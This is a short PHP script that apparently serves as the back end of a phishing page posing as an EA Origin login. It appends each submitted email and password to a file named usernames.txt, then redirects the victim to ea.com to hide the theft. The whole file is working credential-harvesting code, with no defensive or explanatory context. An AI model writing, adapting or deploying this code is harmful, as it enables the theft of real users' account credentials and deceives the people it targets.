<?php

file_put_contents("usernames.txt", "Origin Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.ea.com');
exit();
?>
